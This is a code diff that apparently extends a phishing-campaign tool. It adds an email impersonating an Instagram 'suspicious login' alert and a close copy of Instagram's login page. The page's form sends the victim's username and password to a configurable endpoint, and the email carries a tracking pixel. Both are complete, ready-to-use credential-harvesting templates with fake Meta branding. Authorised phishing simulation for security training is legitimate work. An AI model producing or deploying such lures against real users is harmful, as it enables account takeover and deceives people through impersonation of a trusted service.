@@ -498,12 +498,178 @@ _GOOGLE_LANDING_HTML = """\
 </html>
 """
 
+_INSTAGRAM_EMAIL_HTML = """\
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram - Action Required</title>
+    <style>
+        body { margin: 0; padding: 0; background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
+        .wrapper { max-width: 480px; margin: 32px auto; background: #ffffff; border: 1px solid #dbdbdb; border-radius: 4px; overflow: hidden; }
+        .header { padding: 32px 40px 20px; text-align: center; border-bottom: 1px solid #efefef; }
+        .logo { font-size: 28px; font-weight: 700; letter-spacing: -0.5px; background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; font-family: 'Billabong', cursive, serif; }
+        .body { padding: 28px 40px; color: #262626; }
+        .body p { margin: 0 0 16px; font-size: 14px; line-height: 20px; color: #262626; }
+        .body p.greeting { font-size: 16px; font-weight: 600; }
+        .btn { display: block; width: fit-content; margin: 24px auto; background: linear-gradient(to right, #833ab4, #fd1d1d, #fcb045); color: #ffffff; text-decoration: none; padding: 12px 32px; border-radius: 8px; font-size: 14px; font-weight: 600; letter-spacing: 0.3px; }
+        .divider { border: none; border-top: 1px solid #efefef; margin: 20px 0; }
+        .footer { padding: 16px 40px 24px; text-align: center; }
+        .footer p { font-size: 12px; color: #8e8e8e; margin: 4px 0; line-height: 18px; }
+        .footer a { color: #0095f6; text-decoration: none; }
+    </style>
+</head>
+<body>
+    <div class="wrapper">
+        <div class="header">
+            <div class="logo">Instagram</div>
+        </div>
+        <div class="body">
+            <p class="greeting">Hi {{.FirstName}},</p>
+            <p>We noticed a login attempt to your Instagram account from an unrecognized device.</p>
+            <p><strong>Location:</strong> Paris, France<br>
+               <strong>Device:</strong> Chrome on Windows<br>
+               <strong>Time:</strong> Today at 2:14 AM</p>
+            <p>If this was you, you can ignore this message. If you don't recognize this activity, please secure your account immediately.</p>
+            <a href="{{.URL}}" class="btn">Secure My Account</a>
+            <hr class="divider">
+            <p style="font-size:12px; color:#8e8e8e;">You're receiving this email because someone tried to log in to your Instagram account. If you believe your account has been compromised, visit our Help Centre.</p>
+        </div>
+        <div class="footer">
+            <p>© 2025 Instagram from Meta · 1601 Willow Road, Menlo Park, CA 94025</p>
+            <p><a href="#">Privacy Policy</a> · <a href="#">Terms of Service</a> · <a href="#">Help Centre</a></p>
+        </div>
+    </div>
+    {{TRACKING_PIXEL}}
+</body>
+</html>
+"""
+
+_INSTAGRAM_LANDING_HTML = """\
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+        body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; }
+
+        .card { background: #ffffff; border: 1px solid #dbdbdb; border-radius: 4px; padding: 40px; width: 350px; text-align: center; }
+        .logo { font-size: 36px; font-weight: 700; letter-spacing: -1px; background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; margin-bottom: 28px; font-family: 'Billabong', cursive, serif; }
+
+        form { display: flex; flex-direction: column; gap: 6px; }
+        input { width: 100%; padding: 9px 8px; border: 1px solid #dbdbdb; border-radius: 4px; background: #fafafa; font-size: 12px; color: #262626; outline: none; transition: border-color 0.15s; }
+        input:focus { border-color: #a8a8a8; }
+        input::placeholder { color: #8e8e8e; }
+
+        .btn-login { margin-top: 8px; width: 100%; padding: 8px; background: #0095f6; color: #ffffff; border: none; border-radius: 8px; font-size: 14px; font-weight: 600; cursor: pointer; transition: background 0.15s; }
+        .btn-login:hover { background: #1877f2; }
+
+        .or-divider { display: flex; align-items: center; gap: 16px; margin: 18px 0; }
+        .or-divider::before, .or-divider::after { content: ''; flex: 1; height: 1px; background: #dbdbdb; }
+        .or-divider span { font-size: 13px; font-weight: 600; color: #8e8e8e; letter-spacing: 1px; }
+
+        .btn-facebook { width: 100%; background: transparent; border: none; color: #385185; font-size: 14px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .btn-facebook svg { width: 20px; height: 20px; fill: #385185; }
+
+        .forgot { margin-top: 16px; font-size: 12px; color: #00376b; text-decoration: none; display: block; }
+        .forgot:hover { text-decoration: underline; }
+
+        .signup-card { background: #ffffff; border: 1px solid #dbdbdb; border-radius: 4px; padding: 20px; width: 350px; text-align: center; margin-top: 10px; font-size: 14px; color: #262626; }
+        .signup-card a { color: #0095f6; font-weight: 600; text-decoration: none; }
+
+        .app-links { margin-top: 20px; text-align: center; }
+        .app-links p { font-size: 14px; color: #262626; margin-bottom: 12px; }
+        .badge { display: inline-flex; align-items: center; gap: 8px; background: #000; color: #fff; border-radius: 8px; padding: 7px 14px; margin: 4px; text-decoration: none; min-width: 130px; }
+        .badge-text { display: flex; flex-direction: column; line-height: 1.2; }
+        .badge-text span:first-child { font-size: 9px; letter-spacing: 0.3px; }
+        .badge-text span:last-child { font-size: 14px; font-weight: 600; }
+
+        .footer { margin-top: 40px; text-align: center; font-size: 12px; color: #8e8e8e; }
+        .footer a { color: #8e8e8e; text-decoration: none; margin: 0 8px; }
+        .footer a:hover { text-decoration: underline; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo">Instagram</div>
+
+        <form action="{{FORM_ACTION}}" method="post">
+            <input type="text" name="username" placeholder="Phone number, username, or email" value="{{.Email}}" autocomplete="username" required />
+            <input type="password" name="password" placeholder="Password" autocomplete="current-password" required />
+            <button type="submit" class="btn-login">Log in</button>
+        </form>
+
+        <div class="or-divider"><span>OR</span></div>
+
+        <button class="btn-facebook" type="button">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                <path d="M24 12.073C24 5.405 18.627 0 12 0S0 5.405 0 12.073C0 18.1 4.388 23.094 10.125 24v-8.437H7.078v-3.49h3.047V9.41c0-3.025 1.792-4.697 4.533-4.697 1.312 0 2.686.236 2.686.236v2.97h-1.513c-1.491 0-1.956.93-1.956 1.886v2.267h3.328l-.532 3.49h-2.796V24C19.612 23.094 24 18.1 24 12.073z"/>
+            </svg>
+            Log in with Facebook
+        </button>
+
+        <a href="#" class="forgot">Forgot password?</a>
+    </div>
+
+    <div class="signup-card">
+        Don't have an account? <a href="#">Sign up</a>
+    </div>
+
+    <div class="app-links">
+        <p>Get the app.</p>
+        <!-- App Store badge -->
+        <a href="#" class="badge">
+            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 814 1000" fill="white">
+                <path d="M788.1 340.9c-5.8 4.5-108.2 62.2-108.2 190.5 0 148.4 130.3 200.9 134.2 202.2-.6 3.2-20.7 71.9-68.7 141.9-42.8 61.6-87.5 123.1-155.5 123.1s-85.5-39.5-164-39.5c-76 0-103.7 40.8-165.9 40.8s-105-42.3-150.3-97.8C34.3 752.8 0 663.8 0 577.8c0-159.5 103.4-244.2 205.3-244.2 55.7 0 101.9 36.6 136.8 36.6 33.2 0 85.1-38.8 148.3-38.8 23.9 0 108.2 2 166.1 77.3zm-219.1-166.4c31.1-36.9 53.1-88.1 53.1-139.3 0-7.1-.6-14.3-1.9-20.1-50.6 1.9-110.8 33.7-147.1 75.8-28.5 32.4-55.1 83.6-55.1 135.5 0 7.8 1.3 15.6 1.9 18.1 3.2.6 8.4 1.3 13.6 1.3 45.4 0 102.5-30.4 135.5-71.3z"/>
+            </svg>
+            <div class="badge-text">
+                <span>Download on the</span>
+                <span>App Store</span>
+            </div>
+        </a>
+        <!-- Google Play badge -->
+        <a href="#" class="badge">
+            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24">
+                <path fill="#4CAF50" d="M1.22 0L13.19 12 1.22 24c-.46-.22-.77-.7-.77-1.24V1.24C.45.7.76.22 1.22 0z"/>
+                <path fill="#F44336" d="M17.04 7.97l-3.85-2.21L1.22 0l11.97 12-4.06 4.06 7.91-4.54c.74-.42.74-1.14 0-1.55z"/>
+                <path fill="#FFC107" d="M1.22 24l11.97-12 2.88 2.88-10.9 6.26c-.74.43-1.6.39-2.28-.1L1.22 24z"/>
+                <path fill="#2196F3" d="M1.22 0c.68-.49 1.54-.53 2.28-.1l10.9 6.26-2.88 2.88L1.22 0z"/>
+            </svg>
+            <div class="badge-text">
+                <span>GET IT ON</span>
+                <span>Google Play</span>
+            </div>
+        </a>
+    </div>
+
+    <footer class="footer">
+        <div style="margin-bottom: 16px;">
+            <a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a><a href="#">Jobs</a>
+            <a href="#">Help</a><a href="#">API</a><a href="#">Privacy</a><a href="#">Terms</a>
+            <a href="#">Locations</a><a href="#">Instagram Lite</a>
+        </div>
+        <div>English (UK) · © 2025 Instagram from Meta</div>
+    </footer>
+</body>
+</html>
+"""
+
 _TEMPLATES = [
     {
         'name': 'Google - Security Alert (EN)',
         'subject': 'Security Alert - New Sign-In from New York',
         'email_html': _GOOGLE_EMAIL_HTML,
         'landing_page_html': _GOOGLE_LANDING_HTML,
+    },
+    {
+        'name': 'Instagram - Suspicious Login Alert (EN)',
+        'subject': 'Action Required: Suspicious login attempt on your Instagram account',
+        'email_html': _INSTAGRAM_EMAIL_HTML,
+        'landing_page_html': _INSTAGRAM_LANDING_HTML,
     },
 ]
 
